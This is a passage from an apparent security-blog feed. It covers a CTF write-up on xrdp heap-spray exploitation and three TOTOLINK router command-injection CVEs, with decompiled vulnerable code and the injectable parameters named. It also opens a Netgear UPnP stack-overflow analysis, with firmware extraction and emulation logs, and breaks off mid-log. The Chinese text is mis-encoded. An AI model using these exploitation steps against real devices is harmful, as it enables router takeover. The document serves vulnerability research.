class="number">0</span>;</span><br><span class="line">        <span class="comment">/* assign tcp calls by default */</span></span><br><span class="line">        self-&gt;trans_recv = trans_tcp_recv;</span><br><span class="line">        self-&gt;trans_send = trans_tcp_send;</span><br><span class="line">        self-&gt;trans_can_recv = trans_tcp_can_recv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>trans_create</code> å‡½æ•°æ¥åšå †å–·ã€‚ä¸”åˆ†é…å‡ºæ¥çš„ <code>trans *self</code>  å¯¹è±¡æ‹¥æœ‰å‡½æ•°æŒ‡é’ˆï¼Œæˆ‘ä»¬åªéœ€è¦†ç›– <code>self-&gt;trans_recv</code> å°±èƒ½æ§åˆ¶ PCã€‚å¦å¤–ç¨‹åºæ²¡æœ‰å¼€å¯ PIEï¼Œ ä¸”ç¨‹åºæœ¬èº«æœ‰ <code>g_execlp3</code> ä¹‹ç±»çš„æ‰§è¡Œä»£ç çš„å‡½ï¼Œé¢˜ç›®åˆåªè¦æ±‚æœ¬åœ°ææƒå³å¯ï¼Œæ‰€ä»¥åˆ©ç”¨æ€è·¯æ¯”è¾ƒæ¸…æ™°ã€‚</p><ol><li>åˆ›å»ºå¤šä¸ªé“¾æ¥ï¼Œè¿›è¡Œå †å–·</li><li>æº¢å‡ºè¦†ç›– <code>self-&gt;trans_recv</code> ä¸º <code>g_execlp3</code> ï¼Œ ä¸”æ§åˆ¶ <code>RDI</code> ä¸ºæˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ (è¦ç»å¯¹è·¯å¾„)</li><li>è°ƒç”¨ <code>self-&gt;trans_recv</code> æ‰§è¡Œä»»æ„å‘½ä»¤</li></ol><h2 id="totox-3"><a href="#totox-3" class="headerlink" title="totox/3"></a>totox/3</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>ç”Ÿæ­»ç«é€Ÿï¼Œæœ¬é¢˜åˆ†ä¸ºä¸‰é¢˜ï¼Œéœ€è¦é€‰æ‰‹ä»ä¸‰ä¸ªä¸åŒè·¯å¾„ï¼ˆä¸åŒè·¯å¾„æŒ‡ä»ä¸‰ä¸ªä¸åŒå®é™…äº§ç”Ÿå‘½ä»¤æ³¨å…¥ã€ç ´åå †æ ˆç»“æ„ç­‰å†…å®¹ï¼‰å®ç°å¯¹TOTOLINKçš„æ”»å‡»ã€‚</p><p>è¿™å…¶å®æ˜¯ä¸€ä¸ªè·¯ç”±å™¨é¢˜ç›®ï¼Œ ä¸»åŠæ–¹è¦æ±‚æˆ‘ä»¬é€šè¿‡ä¸‰ä¸ªä¸åŒçš„è·¯å¾„æ”»ç ´è¯¥è·¯ç”±å™¨ï¼Œ å³éœ€è¦ä½¿ç”¨åˆ°ä¸‰ä¸ªä¸åŒçš„æ¼æ´ã€‚ å›ºä»¶ç‰ˆæœ¬ä¸ºï¼š X5000R_å›ºä»¶_V9.1.0u.6118_B20201102</p><p>é€šè¿‡ç½‘ä¸ŠæŸ¥é˜…èµ„æ–™ï¼Œ æˆ‘ä»¬å‘ç°è¯¥æ¬¾è·¯ç”±å™¨æ‹¥æœ‰è®¸å¤šçš„ CVE ç¼–å·ï¼Œ å¹¶ä¸”é¢˜ç›®çš„è¿™ä¸ªç‰ˆæœ¬æ˜¯å—åˆ°å½±å“çš„ã€‚è¿™é‡Œç®€å•åˆ†æä¸‹æˆ‘ä»¬ç”¨åˆ°çš„ä¸‰ä¸ªæ¼æ´</p><h3 id="totox-1-CVE-2021-27710"><a href="#totox-1-CVE-2021-27710" class="headerlink" title="totox/1 CVE-2021-27710"></a>totox/1 CVE-2021-27710</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0044A520 aSettraceroutec:.ascii &quot;setTracerouteCfg&quot;&lt;0&gt;</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A560                 .word sub_41F6A0</span><br></pre></td></tr></table></figure><p>åœ¨cstecgi.cgiä¸­çš„<code>setTracerouteCfg</code> æ¥å£ä¼šè°ƒç”¨ <code>sub_41F6A0</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_41F7E8</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;ping %s -w %d &amp;&gt;/var/log/pingCheck&quot;</span>, Var, v4);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„ <code>ip</code> å‚æ•°å¯æ§ï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p><h3 id="totox-2-CVE-2021-27708"><a href="#totox-2-CVE-2021-27708" class="headerlink" title="totox/2 CVE-2021-27708"></a>totox/2 CVE-2021-27708</h3><p>åœ¨cstecgi.cgiä¸­çš„å‡½æ•° <code>sub_41F6A0</code> ï¼Œ å³ <code>setTracerouteCfg</code> æ¥å£æœ‰å¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;traceroute -m %d %s&amp;&gt;/var/log/traceRouteLog&quot;</span>, v4, Var);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>command</code>  å‚æ•°å¯æ§ï¼Œ å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p><h3 id="totox-3-CVE-2022-27005"><a href="#totox-3-CVE-2022-27005" class="headerlink" title="totox/3 CVE-2022-27005"></a>totox/3 CVE-2022-27005</h3><p>åœ¨cstecgi.cgiä¸­çš„ <code>setWanCfg</code> æ¥å£ä¸­ ï¼Œ å³ <code>sub_4212CC</code> å‡½æ•°é‡Œï¼Œæœ‰å¦‚ä¸‹ä»£ç ç‰‡æ–­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">strcpy</span>(v61, <span class="string">&quot;dhcp&quot;</span>);</span><br><span class="line">    v48 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;hostName&quot;</span>, &amp;byte_437F70);</span><br><span class="line">    <span class="keyword">if</span> ( *v48 )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_set(<span class="string">&quot;wan_hostname&quot;</span>, v48);</span><br><span class="line">      doSystem(<span class="string">&quot;echo  &#x27;%s&#x27;  &gt; /proc/sys/kernel/hostname&quot;</span>, v48);</span><br><span class="line">    &#125;</span><br><span class="line">    v49 = websGetVar(a1, <span class="string">&quot;dhcpMtu&quot;</span>, <span class="string">&quot;1500&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;wan_mtu&quot;</span>, v49);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>hostname</code> å¯è¢«ç”¨æˆ·æ§åˆ¶ï¼Œ å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">CVE-2022-23613-Patched</a></p><p><a href="https://hackmd.io/KjXzQdjDRjOuRjoZZXQo_A">CVE-2021-27710 totolink command inject</a></p><p><a href="https://hackmd.io/7FtB06f-SJ-SCfkMYcXYxA">CVE-2021-27008 totolink command inject</a></p><p><a href="https://web.archive.org/web/20220322013544/https://github.com/wudipjq/my_vuln/blob/main/totolink/vuln_30/30.md">CVE-2022-27005 totolink command inject</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2022-23613" scheme="https://bestwing.me/tags/CVE-2022-23613/"/>
    
    <category term="CVE-2022-27005" scheme="https://bestwing.me/tags/CVE-2022-27005/"/>
    
    <category term="CVE-2021-27710" scheme="https://bestwing.me/tags/CVE-2021-27710/"/>
    
    <category term="CVE-2021-27708" scheme="https://bestwing.me/tags/CVE-2021-27708/"/>
    
  </entry>
  
  <entry>
    <title>PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</title>
    <link href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html"/>
    <id>https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html</id>
    <published>2022-06-30T13:43:00.000Z</published>
    <updated>2022-06-30T14:54:17.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è·ç¦»ä¸Šä¸€ç¯‡ Blog æ›´æ–°å·²ç»å¿«ä¸¤ä¸ªæœˆäº†ï¼Œæƒ³äº†æƒ³åº”è¯¥ç»™é•¿è‰çš„ Blog é™¤é™¤è‰äº†ã€‚äºæ˜¯ä»æˆ‘çš„ç¬”è®°æ–‡æ¡£é‡Œç¿»äº†ä¸€ä¸‹ï¼Œ æŠŠè¿™ä¸ªæ¼æ´ç¿»å‡ºæ¥ç»™å¤§å®¶åˆ†äº«åˆ†äº«ã€‚å…·ä½“å®˜æ–¹é€šå‘Šå¯ä»¥å‚è€ƒï¼š </p><p>ã€1ã€‘<a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 å®˜æ–¹å…¬å‘Š</a></p><p>å½“æ—¶æˆ‘çš„åˆ©ç”¨æ˜¯åœ¨ Netgear R6400v2 å›ºä»¶ç‰ˆæœ¬ä¸º 1.0.4.102 çš„ç¯å¢ƒä¸‹ç¼–å†™çš„ ï¼Œå› æ­¤æœ¬ç¯‡æ–‡ç« ä¹Ÿä»¥æ­¤ä¸ºåŸºç¡€è¿›è¡Œè®²è¿°ã€‚</p><h2 id="å›ºä»¶è·å–"><a href="#å›ºä»¶è·å–" class="headerlink" title="å›ºä»¶è·å–"></a>å›ºä»¶è·å–</h2><p>å›ºä»¶ä¸‹è½½é“¾æ¥: ã€2ã€‘<a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 å›ºä»¶</a></p><p>å½“æˆ‘ä»¬è·å–å›ºä»¶åï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸­è§£å‹å‡ºæ–‡ä»¶ç³»ç»Ÿ ï¼Œ è¿™é‡Œæˆ‘é€šè¿‡ binwalk å’Œ unsquashfs æˆåŠŸæå–å‡ºå¯¹åº”çš„å›ºä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeiMac in ~/Downloads/PSV-2020-0437 [16:43:07]</span></span><br><span class="line">$ msl --run <span class="string">&quot;binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line">[check_container() - msl:93 ] Container status: running</span><br><span class="line">[main() - msl:139 ] Running <span class="built_in">command</span>: bash -c <span class="string">&quot;cd &#x27;/workhub/Downloads/PSV-2020-0437&#x27; ; binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line"></span><br><span class="line">__________               .__  .__  _____</span><br><span class="line">\______   \__  _  ______ |  | |__|/ ____\____</span><br><span class="line"> |     ___/\ \/ \/ /    \|  | |  \   __\/ __ \</span><br><span class="line"> |    |     \     /   |  \  |_|  ||  | \  ___/</span><br><span class="line"> |____|      \/\_/|___|  /____/__||__|  \___  &gt;</span><br><span class="line">                       \/                   \/</span><br><span class="line">                                 no pwn no life</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">58            0x3A            TRX firmware header, little endian, image size: 46354432 bytes, CRC32: 0x93E72BAF, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x20BCFC, rootfs offset: 0x0</span><br><span class="line">86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5276608 bytes</span><br><span class="line">2145590       0x20BD36        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 44208035 bytes, 1807 inodes, blocksize: 131072 bytes, created: 2020-09-22 07:41:07</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:40]</span></span><br><span class="line">$ ls</span><br><span class="line">20BD36.squashfs  56.7z</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:43]</span></span><br><span class="line">$ unsquashfs 20BD36.squashfs</span><br><span class="line">Parallel unsquashfs: Using 8 processors</span><br><span class="line">1694 inodes (2629 blocks) to write</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_xattr: failed to write xattr security.selinux <span class="keyword">for</span> file squashfs-root/bin/addgroup because extended attributes are not supported by the destination filesystem</span><br><span class="line"></span><br><span class="line">Ignoring xattrs <span class="keyword">in</span> filesystem</span><br><span class="line"></span><br><span class="line">To avoid this error message, specify -no-xattrs</span><br><span class="line">[==========================================================================================================================================================================================================================| ] 2628/2629  99%</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:50] C:2</span></span><br><span class="line">$ ls squashfs-root</span><br><span class="line">bin  data  dev  etc  lib  media  mnt  opt  proc  sbin  share  sys  tmp  usr  var  www</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><p>ä¼—æ‰€å‘¨çŸ¥ UPNPç›¸å…³çš„ç¨‹åºåœ¨è·¯ç”±å™¨ä¸Šæ˜¯ç»å¸¸å‡ºç°æ¼æ´çš„ã€‚è¿™æ¬¡ä¹Ÿä¸ä¾‹å¤–ï¼Œ PSV-2020-0437 çš„æ¼æ´ä¹Ÿæ˜¯å‡ºç°åœ¨ UPNP çš„ç›¸å…³å¤„ç†ä»£ç ä¸­ã€‚æˆ‘ä»¬ä»åˆšè§£å‹å‡ºæ¥çš„æ–‡ä»¶ç³»ç»Ÿä¸­æå–å‡º upnpd ç¨‹åºï¼Œ ç„¶åæˆ‘ä»¬ç”¨ ida pro æ‰“å¼€ã€‚</p><p>æˆ‘ä»¬é€šè¿‡å¯¹ <code>recvfrom</code> äº¤å‰å¼•ç”¨ï¼Œ æ‰¾åˆ°ç¨‹åºçš„å…¥å£ï¼Œ å¯ä»¥çœ‹è¯¥ç¨‹åºä¸€å¼€å§‹å¯è¯»å…¥å¤§å°ä¸º 0x1fff ã€‚ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png"></a></p><p>ç„¶åæˆ‘ä»¬è·Ÿç€æ•°æ®æµï¼Œ å³ <code>inputBuf</code>  ï¼Œæˆ‘ä»¬çœ‹åˆ°ç¨‹åºä¼šè°ƒç”¨ <code>ssdp_http_method_check</code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png"></a></p><p>è¯¥å‡½æ•°ä¼šå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œéƒ¨åˆ†è§£æï¼Œä¾‹å¦‚ <code>M-SEARCH</code> ã€<code>ssdp:discover</code>  ç­‰å…³é”®è¯ï¼Œ æœ¬æ¬¡çš„æ¼æ´æ˜¯åœ¨ <code>sub_22D20</code> å‡½æ•°ä¸­å‘ç”Ÿçš„ï¼Œ æˆ‘ä»¬ç‚¹è¿›å»æŸ¥çœ‹ä¸‹è¿™ä¸ªå‡½æ•°ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png"></a></p><p>é€šè¿‡é˜…è¯»ä¸Šé¢çš„ä»£ç ï¼Œ æˆ‘ä»¬ä¼šå‘ç°è¯¥å‡½æ•°åœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>((<span class="keyword">char</span> *)v6, (<span class="keyword">const</span> <span class="keyword">char</span> *)(MXstart + <span class="number">3</span>), end - (MXstart + <span class="number">3</span>));</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>strncpy</code> çš„æ—¶å€™ï¼Œæ‹·è´çš„é•¿åº¦è®¡ç®—ä¸Šå¤„ç†ä¸å½“ï¼Œä¼šåœ¨æ­¤å¤„äº§ç”Ÿæ ˆæº¢å‡ºã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç”±äºå½“æ—¶æ‰‹å¤´æ²¡æœ‰ RV6400v2 çš„è®¾å¤‡ï¼Œ å› æ­¤æˆ‘é‡‡å–ä½¿ç”¨ qemu-user è¿›è¡Œæ¨¡æ‹Ÿçš„æ–¹æ¡ˆã€‚ </p><p>å…·ä½“å‡ ä¸ªè¸©å‘ä»¥åŠè§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ol><li><code>/dev/nvram: No such file or directory</code></li></ol><p>ç”±äº netgear ä½¿ç”¨åˆ°äº† NVRAM ï¼Œ å› æ­¤æˆ‘ä»¬éœ€è¦ hook ä¸‹ NVRAM ç›¸å…³çš„å‡½æ•°ï¼Œ è¿™é‡Œæˆ‘ç”¨çš„ä¸€ä¸ªç½‘ä¸Šç¼–è¯‘å¥½çš„å®ç° ï¼šã€3ã€‘ <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a></p><ol start="2"><li>ç¼ºå¤±ç¬¦å·</li></ol><p>æ‰¾ä¸åˆ° dlsym çš„ç¬¦å·ã€‚ä¹‹æ‰€ä»¥ä¼šç”¨åˆ° dlsymï¼Œæ˜¯å› ä¸ºè¯¥åº“çš„å®ç°è€…è¿˜åŒæ—¶ hook äº† systemã€fopenã€open ç­‰å‡½æ•°</p><p><code>/lib/libdl.so.0</code> å¯¼å‡ºäº†è¯¥ç¬¦å·,æ‰€ä»¥ LD_PRELOAD çš„æ—¶å€™æŠŠè¿™ä¸ªä¹ŸåŠ ä¸Š</p><ol start="3"><li>ç¼ºå°‘ä¸€äº›ç›®å½•ä»¥åŠé…ç½®ä¿¡æ¯</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat tmp/nvram.ini</span></span><br><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=172.19.32.152</span><br><span class="line">hwver=R6400</span><br><span class="line">friendly_name=R6400</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><ol start="4"><li>æŒ‚è½½ /proc /dev ç›®å½•<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br></pre></td></tr></table></figure></li></ol><p>åˆ°è¿™æˆ‘ä»¬å°±åŸºæœ¬åˆ©ç”¨æ­£å¸¸è¿è¡Œ upnpd ç¨‹åºäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ server in /home/squashfs-root [19:32:11]</span></span><br><span class="line">$ chroot . sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2020-09-18 17:38:05 CST) built-in shell (ash)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a list of built-in commands.</span><br><span class="line"></span><br><span class="line"><span class="comment"># LD_PRELOAD=&quot;/custom_nvram.so /lib/libdl.so.0&quot; ./usr/sbin/upnpd</span></span><br><span class="line"><span class="comment"># [0x0002465c] fopen(&#x27;/var/run/upnpd.pid&#x27;, &#x27;wb+&#x27;) = 0x000db150</span></span><br><span class="line">[0x00024688] custom_nvram initialised</span><br><span class="line">[0xff757d34] fopen(<span class="string">&#x27;/tmp/nvram.ini&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) = 0x000db150</span><br><span class="line">[nvram 0] upnpd_debug_level = 9</span><br><span class="line">[nvram 1] lan_ipaddr = 127.0.0.1</span><br><span class="line">[nvram 2] hwver = R6400</span><br><span class="line">[nvram 3] friendly_name = R6400</span><br><span class="line">[nvram 4] upnp_enable = 1</span><br><span class="line">[nvram 5] upnp_turn_on = 1</span><br><span class="line">[nvram 6] upnp_advert_period = 30</span><br><span class="line">[nvram 7] upnp_advert_ttl = 4</span><br><span class="line">[nvram 8] upnp_portmap_entry = 1</span><br><span class="line">[nvram 9] upnp_duration = 3600</span><br><span class="line">[nvram 10] upnp_DHCPServerConfigurable = 1</span><br><span class="line">[nvram 11] wps_is_upnp = 0</span><br><span class="line">[nvram 12] upnp_sa_uuid = 00000000000000000000</span><br><span class="line">[nvram 13] lan_hwaddr = AA:BB:CC:DD:EE:FF</span><br><span class="line">[nvram 14] lan_hwaddr =</span><br><span class="line">Read 15 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(<span class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">[0x00024728] acosNvramConfig_get(<span 